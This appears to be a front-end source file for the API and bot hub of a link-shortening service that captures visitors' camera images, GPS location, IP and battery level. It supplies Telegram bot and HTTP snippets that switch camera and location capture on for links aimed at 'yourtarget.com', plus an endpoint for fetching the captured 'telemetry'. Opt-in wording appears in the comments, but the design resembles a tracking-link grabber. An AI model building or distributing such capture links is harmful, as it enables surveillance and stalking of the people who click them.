"use client";

import { useState } from "react";
import { useApp } from "@/components/AppProvider";
import { Modal } from "@/components/ui/Modal";
import { copyText } from "@/lib/client";

type DocTab = "json" | "code" | "html";
type Snippet = "node-bot" | "py-bot" | "curl" | "node-fetch" | "py-requests";

const SNIPPETS: { id: Snippet; label: string }[] = [
  { id: "node-bot", label: "🤖 Telegram JS Bot" },
  { id: "py-bot", label: "🐍 Python/TeleBot" },
  { id: "curl", label: "⚡ cURL" },
  { id: "node-fetch", label: "🟢 Node Fetch" },
  { id: "py-requests", label: "💡 Py Requests" },
];

function snippetFor(id: Snippet, origin: string): string {
  switch (id) {
    case "node-bot":
      return `const TelegramBot = require('node-telegram-bot-api');
// 1. Swap with your own Telegram Bot Token
const token = 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(token, { polling: true });

const API_ENDPOINT = '${origin}';

// Listen for /shorten <url> inside telegram
bot.onText(/\\/shorten (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const longUrl = match[1];

  // Maps visitor log streams back to this identifier
  const userPhone = String(msg.from.id);

  try {
    const res = await fetch(\`\${API_ENDPOINT}/api/shorten\`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        longUrl,
        phoneNumber: userPhone,
        captureCamera: true,    // Camera capture only after visitor opt-in + browser permission
        captureLocation: true   // GPS capture only after visitor opt-in + browser permission
      })
    });

    const data = await res.json();
    if (data.success) {
      bot.sendMessage(chatId, \`⚡ Smart Link Spawned!\\n\\n🔗 Short URL: \${data.shortUrl}\\n\\nVisitors can opt in to analytics, camera or GPS at the gateway; camera/GPS require separate browser permission. No capture starts before opt-in. Sync ID: \${userPhone}\`, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(chatId, \`❌ Engine rejected the request: \${data.message || data.error}\`);
    }
  } catch (error) {
    bot.sendMessage(chatId, \`❌ Script exception: \${error.message}\`);
  }
});`;
    case "py-bot":
      return `import telebot
import requests

# 1. Swap with your Telegram token
API_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
bot = telebot.TeleBot(API_TOKEN)

API_ENDPOINT = "${origin}"

@bot.message_handler(commands=['shorten'])
def generate_link_api(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /shorten <URL>")
            return

        long_url = parts[1]
        user_id = str(message.from_user.id)  # Maps tracking logs back to this ID

        payload = {
            "longUrl": long_url,
            "phoneNumber": user_id,
            "captureCamera": True,
            "captureLocation": True
        }

        res = requests.post(
            f"{API_ENDPOINT}/api/shorten",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        api_data = res.json()

        if api_data.get("success"):
            short_url = api_data.get("shortUrl")
            bot.reply_to(
                message,
                f"⚡ *Smart Link Spawned!*\\n\\n🔗 *Short URL:* {short_url}\\n\\nSync with ID: *{user_id}*",
                parse_mode="Markdown"
            )
        else:
            bot.reply_to(message, f"❌ Link Engine rejected the request: {api_data.get('message')}")

    except Exception as e:
        bot.reply_to(message, f"❌ Script exception: {str(e)}")

bot.infinity_polling()`;
    case "curl":
      return `curl -X POST "${origin}/api/shorten" \\
  -H "Content-Type: application/json" \\
  -d '{
    "longUrl": "https://google.com",
    "phoneNumber": "+1234567890",
    "captureCamera": true,
    "captureLocation": true
  }'`;
    case "node-fetch":
      return `const fetchShortUrl = async () => {
  const url = "${origin}/api/shorten";
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        longUrl: "https://yourtarget.com",
        phoneNumber: "+1234567890", // Links stream tracking back to the dashboard
        captureCamera: true,
        captureLocation: true
      })
    });
    const result = await res.json();
    console.log("⚡ Smart ShortUrl Generated ->", result.shortUrl);
  } catch (err) {
    console.error("Fetch rejection ->", err);
  }
};
fetchShortUrl();`;
    case "py-requests":
      return `import requests

url = "${origin}/api/shorten"
req_body = {
    "longUrl": "https://yourtarget.com",
    "phoneNumber": "+1234567890",  # Group visit logs seamlessly
    "captureCamera": True,
    "captureLocation": True
}

try:
    response = requests.post(url, json=req_body, headers={"Content-Type": "application/json"})
    response_json = response.json()
    print("⚡ Smart Shortlink Spawned:", response_json.get("shortUrl"))
except Exception as error:
    print("Requests post failed:", error)`;
  }
}

function promptDoc(origin: string): string {
  return `Here is the API documentation to integrate our shortlink service:

Endpoint: POST ${origin}/api/shorten
Headers:
  Content-Type: application/json

Body Params (JSON):
- longUrl (string, required): The target link to shorten.
- customAlias (string, optional): A custom text alias.
- phoneNumber (string, optional/required): Required if calling via bot or no deviceId. Identifies the user.
- captureCamera (boolean, optional): Offers camera capture; visitor opt-in and browser permission are required.
- captureLocation (boolean, optional): Offers GPS capture; visitor opt-in and browser permission are required.
- socialGateTitle (string, optional): Setup a social lock title.
- socialGateUrl (string, optional): The URL for social lock verification.
- password (string, optional): Sets a password.
- deviceId (string, optional): ID to sync history with the UI.

Response (201):
{
  "success": true,
  "shortUrl": "${origin}/alias",
  "data": { ...dbRecord }
}

Please generate integration code for this API.`;
}

const JSON_SCHEMA = (origin: string) => `{
  "success": true,
  "shortUrl": "${origin}/myalias",
  "latestClick": {
    "ip_address": "8.8.8.8",
    "location_name": "New York, US",
    "captured_image": "data:image/jpeg;base64,...",
    "battery_level": 0.95,
    "created_at": "2026-05-27T12:00:00Z"
  }
}`;

/**
 * Developer API & Bot Hub.
 * Gated behind a free account, exactly like the reference build: guests get the
 * marketing panel with Create/Sign-in CTAs, members get the live docs, code
 * generators and copy-to-prompt tooling.
 */
export function ApiHubModal() {
  const { apiHubOpen, setApiHubOpen, user, openAuth, origin, toast, click, setExportOpen } = useApp();
  const [tab, setTab] = useState<DocTab>("json");
  const [snippet, setSnippet] = useState<Snippet>("node-bot");
  const [copied, setCopied] = useState(false);

  const close = () => {
    setApiHubOpen(false);
    setCopied(false);
  };

  const copy = async (text: string, message: string) => {
    const ok = await copyText(text);
    if (ok) {
      setCopied(true);
      window.setTimeout(() => setCopied(false), 2000);
    }
    toast(ok ? message : "Copy blocked by the browser", ok ? "success" : "error");
  };

  const jsonDocs = [
    {
      title: "1. CREATE SMART SHORTLINK (POST)",
      body: (
        <>
          <span className="text-zinc-500">URL: </span>
          <span className="text-zinc-100 font-bold">{origin}/api/shorten</span>
        </>
      ),
    },
  ];

  return (
    <Modal
      open={apiHubOpen}
      onClose={close}
      title="Developer API Hub"
      subtitle="REST API, cURL & Telegram SDK"
      icon={<span className="text-lg">🧩</span>}
      maxWidth="max-w-2xl"
    >
      {!user ? (
        <div className="space-y-3.5">
          <div className="clay-recessed rounded-2xl p-4 sm:p-5">
            <div className="flex items-center gap-2 mb-1.5">
              <span className="w-8 h-8 rounded-xl bg-amber-400/30 text-amber-900 flex items-center justify-center shrink-0">
                <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round"><rect x="4" y="10" width="16" height="10" rx="2" /><path d="M8 10V7a4 4 0 018 0v3" /></svg>
              </span>
              <div>
                <h3 className="text-[12.5px] font-black uppercase tracking-wider text-zinc-900">
                  Developer API &amp; Bot Hub is Gated
                </h3>
                <p className="text-[10px] font-bold text-amber-800">Unlocked with Free Account</p>
              </div>
            </div>
            <p className="text-[11.5px] font-semibold text-zinc-600 leading-relaxed">
              Access to our HTTP endpoints, bot SDKs, and code generators is reserved for registered
              members. Create a free account in 5 seconds to unlock everything!
            </p>
          </div>

          <div className="clay-recessed rounded-2xl p-4 space-y-3">
            {[
              {
                icon: "🔗",
                title: "Direct HTTP Endpoints",
                sub: "POST /api/shorten & Realtime Telemetry",
              },
              {
                icon: "🤖",
                title: "Telegram Bot SDK",
                sub: "Ready-to-deploy Node.js and Python bot templates",
              },
              {
                icon: "📦",
                title: "Standalone Client Widget",
                sub: "Deployable index.html self-hosted source",
              },
            ].map((row) => (
              <div key={row.title} className="flex items-start gap-2">
                <span className="text-[13px] leading-none mt-0.5">{row.icon}</span>
                <div>
                  <strong className="text-[11.5px] font-black text-zinc-900">{row.title}</strong>
                  <p className="text-[10.5px] text-zinc-500 font-medium">{row.sub}</p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex flex-col sm:flex-row items-center gap-2.5">
            <button
              onClick={() => {
                click(660);
                close();
                openAuth("register");
              }}
              className="w-full sm:flex-1 py-3 px-4 rounded-full font-black text-xs uppercase tracking-wider text-white glass-orb orb-blue active:scale-95 flex items-center justify-center gap-2"
            >
              <span>✨</span>
              <span>Create Free Account</span>
            </button>
            <button
              onClick={() => {
                click(550);
                close();
                openAuth("login");
              }}
              className="w-full sm:flex-1 py-3 px-4 rounded-full font-black text-xs uppercase tracking-wider text-zinc-900 glass-orb orb-champagne active:scale-95 flex items-center justify-center gap-2"
            >
              <span>🔑</span>
              <span>Sign In</span>
            </button>
          </div>
        </div>
      ) : (
        <div className="flex flex-col">
          <div className="flex liquid-glass-input p-1 rounded-full gap-1.5 shrink-0 overflow-x-auto scrollbar-none mb-4">
            {(
              [
                { id: "json", label: "JSON API Docs" },
                { id: "code", label: "Bot / SDK Codes" },
                { id: "html", label: "Standalone HTML" },
              ] as const
            ).map((t) => (
              <button
                key={t.id}
                onClick={() => {
                  click(600);
                  setTab(t.id);
                }}
                className={`flex-1 px-3 py-2 text-[10.5px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95 ${
                  tab === t.id ? "nav-pill-active shadow-md text-white" : "text-zinc-700 hover:text-zinc-950 font-bold"
                }`}
              >
                {t.label}
              </button>
            ))}
          </div>

          {tab === "json" ? (
            <>
              <div className="clay-scroll mb-4 bg-zinc-950/90 border border-zinc-800 rounded-2xl p-4 sm:p-5 font-mono text-[11.5px] leading-relaxed text-zinc-200 space-y-4 shadow-inner max-h-[46vh] overflow-y-auto">
                {jsonDocs.map((row) => (
                  <div key={row.title}>
                    <span className="text-emerald-400 font-extrabold">{row.title}</span>
                    <br />
                    {row.body}
                  </div>
                ))}

                <div>
                  <span className="text-amber-400 font-bold">Headers:</span>
                  <br />
                  <span className="text-zinc-300">Content-Type: application/json</span>
                </div>

                <div>
                  <span className="text-amber-400 font-bold">Body Params (JSON):</span>
                  {(
                    [
                      ["longUrl", "(string, req): Destination link URL"],
                      ["customAlias", "(string, opt): Desired custom identifier path"],
                      ["phoneNumber", "(string, opt): Bot/User identifier (used to fetch telemetry across channels)"],
                      ["captureCamera", "(boolean, opt): Offers camera capture; requires visitor opt-in and browser permission"],
                      ["captureLocation", "(boolean, opt): Offers GPS capture; requires visitor opt-in and browser permission"],
                      ["socialGateTitle", "(string, opt): Custom social verification banner Title"],
                      ["socialGateUrl", "(string, opt): External verification redirect URL"],
                      ["password", "(string, opt): Setup dynamic password authorization lock"],
                      ["deviceId", "(string, opt): Auto browser sync track identification"],
                    ] as const
                  ).map(([key, desc]) => (
                    <div key={key} className="pl-3">
                      <span className="text-blue-400 font-bold">{key}</span>{" "}
                      <span className="text-zinc-400">{desc}</span>
                    </div>
                  ))}
                </div>

                <div className="border-t border-zinc-800 pt-3">
                  <span className="text-emerald-400 font-extrabold">
                    2. FETCH CAPTURED TELEMETRY LOGS (GET)
                  </span>
                  <br />
                  <span className="text-zinc-500">URL: </span>
                  <span className="text-zinc-100 font-bold">{origin}/api/shorten?phoneNumber=</span>
                  <span className="text-blue-400 font-bold">YOUR_TELEGRAM_ID_OR_PHONE</span>
                  <br />
                  <span className="text-zinc-500">Alternative: </span>
                  <span className="text-zinc-100 font-bold">{origin}/api/links?deviceId=</span>
                  <span className="text-blue-400 font-bold">YOUR_DEVICE_ID</span>
                </div>

                <div>
                  <span className="text-amber-400 font-bold">Expected Telemetry Result (JSON Schema):</span>
                  <pre className="text-zinc-300 font-mono mt-1 text-[11px] leading-snug whitespace-pre-wrap">
                    {JSON_SCHEMA(origin)}
                  </pre>
                </div>
              </div>

              <button
                onClick={() => void copy(promptDoc(origin), "Prompt Docs Copied!")}
                className="w-full shrink-0 flex items-center justify-center gap-2 glass-orb orb-blue text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl active:scale-95"
              >
                <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round"><path d="M8 3H7a3 3 0 00-3 3v4l-2 2 2 2v4a3 3 0 003 3h1" /><path d="M16 3h1a3 3 0 013 3v4l2 2-2 2v4a3 3 0 01-3 3h-1" /></svg>
                <span>{copied ? "Copied Selected Snippet!" : "Copy to Prompt AI"}</span>
              </button>
            </>
          ) : null}

          {tab === "code" ? (
            <>
              <div className="flex liquid-glass-input p-1 rounded-full gap-1.5 shrink-0 overflow-x-auto scrollbar-none mb-4">
                {SNIPPETS.map((s) => (
                  <button
                    key={s.id}
                    onClick={() => {
                      click(520);
                      setSnippet(s.id);
                    }}
                    className={`flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95 ${
                      snippet === s.id ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                    }`}
                  >
                    {s.label}
                  </button>
                ))}
              </div>

              <div className="clay-scroll mb-4 bg-zinc-950/90 border border-zinc-800 rounded-2xl p-4 sm:p-5 shadow-inner max-h-[46vh] overflow-y-auto">
                <pre className="text-[11px] font-mono text-zinc-200 select-all leading-relaxed whitespace-pre-wrap">
                  {snippetFor(snippet, origin)}
                </pre>
              </div>

              <button
                onClick={() => void copy(snippetFor(snippet, origin), "Copied Selected Snippet!")}
                className="w-full shrink-0 flex items-center justify-center gap-2 glass-orb orb-blue text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl active:scale-95"
              >
                <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.4"><rect x="9" y="9" width="12" height="12" rx="2" /><path d="M5 15V5a2 2 0 012-2h8" /></svg>
                <span>{copied ? "Copied Selected Snippet!" : "Copy Code Snippet"}</span>
              </button>
            </>
          ) : null}

          {tab === "html" ? (
            <div className="space-y-3">
              <div className="clay-recessed rounded-2xl p-4">
                <h3 className="text-[12px] font-black uppercase tracking-wider text-zinc-900 mb-1">
                  Standalone Client Widget
                </h3>
                <p className="text-[11px] font-semibold text-zinc-600 leading-relaxed">
                  Export a self-contained <code className="font-mono text-[10.5px]">index.html</code> you can
                  host anywhere. It talks to this deployment&apos;s <code className="font-mono text-[10.5px]">/api/shorten</code>{" "}
                  endpoint and ships in three visual tiers.
                </p>
              </div>
              <button
                onClick={() => {
                  click(700);
                  close();
                  setExportOpen(true);
                }}
                className="w-full flex items-center justify-center gap-2 glass-orb orb-green text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl active:scale-95"
              >
                <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round"><path d="M12 3v12" /><path d="M7 10l5 5 5-5" /><path d="M5 21h14" /></svg>
                <span>Open Standalone HTML Export</span>
              </button>
            </div>
          ) : null}
        </div>
      )}
    </Modal>
  );
}
